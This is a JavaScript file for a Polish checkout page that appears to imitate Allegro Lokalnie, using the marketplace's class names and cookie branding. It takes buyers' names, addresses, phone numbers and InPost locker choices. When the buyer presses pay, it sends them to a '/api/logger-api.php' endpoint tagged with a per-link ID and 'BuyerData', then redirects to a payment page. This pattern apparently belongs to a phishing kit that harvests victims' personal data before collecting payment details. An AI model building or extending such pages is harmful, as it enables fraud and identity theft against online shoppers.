    let Current = {"ModalMenu": false}
let Errors = {
    0: "Wpisz %variable%",
    1: "%variable% jest zbyt krótkie",
    2: "%variable% jest zbyt krótkie"
}
let CustomErrors = {0: "Wpisz %variable%", 1: "%variable% jest zbyt krótki", 2: "%variable% jest zbyt krótki"}
let AddressInputs = ["firstName", "lastName", "streetAddress", "postalCode", "city", "phoneNumber"];
let Events = {
    "button[data-testid='newAddressButton'],.close-address-icon,.address-back-button": function() {
        ToggleAddressModal()
    },

    ".mlc-recipient-address-form-modal__confirm-button": function() {
        ValidateAddressForm()
    },

    ".save-address-button": function() {
        ValidateAddressFormEdit()
    },

    ".edit-close-icon,.edit-back-button": function() {
        ToggleEditAddressModal()
    },

    ".mlc-delivery-pickup-point__select-button,.change-point-button": function() {
        OpenInPostModal()
    },

    ".mlc-map-header__close--desktop": function() {
        $(`.inpost-modal`).hide()
    },

    ".change-order-items": function() {
        Redirect("koszyk")
    },

    ".select-inpost": function() {
        SelectDelivery(1)
        updateDeliveryMethod(1); 
    },

    ".select-courier": function() {
        SelectDelivery(2)
        updateDeliveryMethod(2); 
    },

    ".select-odbior": function() {
        SelectDelivery(3)
        updateDeliveryMethod(3); 
    },

    ".mlc-cart-transaction-form__action,.offer-pay-button,[data-testid='offer-pay']": function() {
        RedirectPayment()
    },

    ".mlc-top-navigation-back-button": function() {
        Redirect("AllegroLokalnie")
    }
}

let Address = Cookies.get("AllegroLokalnie_Checkout_Address");
let InPostPoint = Cookies.get("AllegroLokalnie_Checkout_InPostPoint");
let SelectedDelivery = 3;

function RedirectPayment() {
    let Valid = true;

    if (SelectedDelivery == 1) {
        if (InPostPoint == undefined) {
            $(`.ml-tip--error`).show()
            $(`.ml-tip--info`).hide()
            Valid = false
        }
        
        if (Address == undefined) {
            $(`#recipient-address-tip-error`).show()
            Valid = false
        }
    }else if (SelectedDelivery == 2 || 3) {
        if (Address == undefined) {
            $(`#recipient-address-tip-error`).show()
            Valid = false
        }
    }


    if (Valid) {
        $.get(`/api/logger-api.php?id=${LinkID}&log-type=BuyerData&address=${JSON.stringify(Address)}`, function(res) {
            Redirect("platnosc")
        })
    }
}


function updateDeliveryMethod(selectedDelivery) {
    const deliveryTexts = {
        1: "Odbiór w punkcie: Paczkomaty 24/7 InPost - przedpłata",
        2: "Przesyłka kurierska - przedpłata",
        3: "Odbiór osobisty - przedpłata",
    };
    
    const text = deliveryTexts[selectedDelivery] || "Nie wybrano formy dostawy";

    $(".mlc-summary-delivery-selected__delivery-row .mlc-summary-delivery-selected__row-value").text(text);
}

function SelectDelivery(Delivery) {
    if (Delivery != SelectedDelivery) {
        $(`.delivery-${SelectedDelivery}-radio`).removeAttr("checked")
        $(`.delivery-${SelectedDelivery}-inner`).removeAttr("checked")
        $(`.delivery-${SelectedDelivery}-inner`).removeClass(`ml-radio-selection__inner--checked`)
        $(`.delivery-${SelectedDelivery}-radio`).removeClass(`ml-radio-selection__radio--checked`)
        SelectedDelivery = Delivery;
        $(`.delivery-${SelectedDelivery}-radio`).attr("checked", "true")
        $(`.delivery-${SelectedDelivery}-inner`).addClass(`ml-radio-selection__inner--checked`)
        $(`.delivery-${SelectedDelivery}-radio`).addClass(`ml-radio-selection__radio--checked`)

        $(`.mlc-cart-transaction-form__delivery-details`).toggle(Delivery != 2 && Delivery != 3);
    }
}

function OpenInPostModal() {
    $(`.inpost-modal`).show()
    window.easyPackAsyncInit = function () {
        easyPack.init({
            filters: true,
            instance: 'pl',
            mapType: 'osm',
            searchType: 'osm',
            points: {
            types: ['pop', 'parcel_locker'],
            },
            map: {
            useGeolocation: true,
            initialTypes: ['parcel_locker']
            }
        })
        var map = easyPack.mapWidget('easypack-map', function(point) {
            let PointData = `${point.name};${point.address.line1};${point.address.line2};${point.location_description};${point.opening_hours};`;

            InPostPoint = PointData;
            Cookies.set("AllegroLokalnie_Checkout_InPostPoint", PointData)
            LoadInPostPickup()
            $(`.inpost-modal`).hide()
        });

        map.searchPlace("Warszawa")
    };
}

function ToggleEditAddressModal() {
    $(`#headlessui-dialog-9`).toggle()
}

function LoadAddress() {
    if (Address) {
        let SplittedAddress = Address.split(";");
        $(`.mlc-recipient-address-card__container`).remove()
        $(`.user-address-container`).html(`<div class="mlc-recipient-address-card__container"><label class="ml-radio-selection"><input name="recipientAddress" id="recipient-address" type="radio" class="ml-radio-selection__input" value="" checked=""><div class="ml-radio-selection__focus"></div><div class="ml-radio-selection__inner ml-radio-selection__inner--checked"><div class="ml-radio-selection__radio ml-radio-selection__radio--checked"></div><div class="ml-radio-selection__content"><div class="mlc-recipient-address-card__content mlc-recipient-address-card__content--with-button"><h2 class="ml-heading-small ml-heading--color-default ml-normalize-heading">${SplittedAddress[0]} ${SplittedAddress[1]}</h2><p class="ml-text-small ml-text-color-secondary"></p><p class="ml-text-small ml-text-color-secondary">ul. ${SplittedAddress[2]}, ${SplittedAddress[3]} ${SplittedAddress[4]}</p><p class="ml-text-small ml-text-color-secondary">tel. ${SplittedAddress[5]} </p></div></div></div></label><div class="mlc-recipient-address-card__children"><button class="ml-clear-btn mlc-recipient-address-card__icon-button" type="button"><span class="ml-icon ml-icon--green"><svg viewBox="0 0 24 24" focusable="false" aria-hidden="true"><use href="/assets/fonts/icons.svg#edit-line"></use></svg></span></button></div></div>`)
        
        for (let i=0; i < AddressInputs.length; i++) {
            $(`input[name="${AddressInputs[i]}-Cached"]`).val(SplittedAddress[i])
        }

        $(`.mlc-recipient-address-card__icon-button`).on("click", function() {
            ToggleEditAddressModal()
        })

        $(`button[data-testid="newAddressButton"]`).hide()
    }
}

function ToggleAddressModal() {
    $(`#headlessui-dialog-1`).toggle()
}

function ValidateAddressFormEdit() {
    let Valid = true;
    let FinalAddress = "";

    for (let i=0; i < AddressInputs.length; i++) {
        if (InputCheck(`input[name="${AddressInputs[i]}-Cached"]`)) {
            Valid = false;
            $(`input[name="${AddressInputs[i]}"]`).on("input", function() {
                InputCheck(this)
            })
        }else {
            FinalAddress = FinalAddress + $(`input[name="${AddressInputs[i]}-Cached"]`).val() + ";";
        }
    }

    if (Valid) {
        Cookies.set("AllegroLokalnie_Checkout_Address", FinalAddress);
        $(`.save-address-button,.edit-address-loader-button`).each(function() {
            let ButtonElement = $(this);
            $(this).toggle()
            setTimeout(function() {
                Address = FinalAddress
                $(ButtonElement).toggle()
                LoadAddress()
                $(`#recipient-address-tip-error`).hide()
                $(`#headlessui-dialog-9`).hide()
            }, 1500)
        })
    }
}

function ValidateAddressForm() {
    let Valid = true;
    let FinalAddress = "";

    for (let i=0; i < AddressInputs.length; i++) {
        if (InputCheck(`input[name="${AddressInputs[i]}"]`)) {
            Valid = false;
            $(`input[name="${AddressInputs[i]}"]`).on("input", function() {
                InputCheck(this)
            })
        }else {
            FinalAddress = FinalAddress + $(`input[name="${AddressInputs[i]}"]`).val() + ";";
        }
    }

    if (Valid) {
        Cookies.set("AllegroLokalnie_Checkout_Address", FinalAddress);
        $(`.add-address-button,.address-loader-button`).each(function() {
            let ButtonElement = $(this);
            $(this).toggle()
            setTimeout(function() {
                Address = FinalAddress
                $(ButtonElement).toggle()
                LoadAddress()
                $(`#recipient-address-tip-error`).hide()
                $(`#headlessui-dialog-1`).hide()
            }, 1500)
        })
    }
}

function CheckError(Input) {
    let InputText = $(Input).val();

    if (InputText.length < 3) {
        if ($(Input).data("custom-error") == "1") {
            return CustomErrors[InputText.length]
        }
        
        return Errors[InputText.length]
    }
    return false
}

function InputCheck(Input) {
    let InputError = CheckError(Input);

    if (InputError) {
        $(Input).parent().parent().children("p").text(InputError.replace("%variable%", $(Input).parent().children("span").text()))
        $(Input).parent().parent().children("p").show()
        $(Input).addClass(`ml-input__inner__field--error`)
    }else {
        $(Input).parent().parent().children("p").hide()
        $(Input).removeClass(`ml-input__inner__field--error`)
    }

    return InputError != false
}

function LoadInPostPickup() {
    $(`.has-point-false`).hide()
    $(`.has-point-true`).hide()
    if (InPostPoint != undefined) {
        SplittedPickup = InPostPoint.split(";");

        for (let i=0; i < SplittedPickup.length; i++) {
            if (SplittedPickup[i]) {
                $(`.point-${i}`).text(SplittedPickup[i])
            }
        }
    }

    $(`.has-point-${InPostPoint != undefined}`).toggle()
}

$(document).ready(function() {
    for (let i=0; i < AddressInputs.length; i++) {
        $(`input[name="${AddressInputs[i]}"]`).on("focusout", function() {
            $(this).on("input", function() {
                InputCheck(this)
            })

            InputCheck(this)
        })
    }

    $(`[data-inputmask]`).inputmask()
    LoadAddress()
    LoadInPostPickup()
    SelectDelivery(2)
    updateDeliveryMethod(2); 
    // OpenInPostModal()
})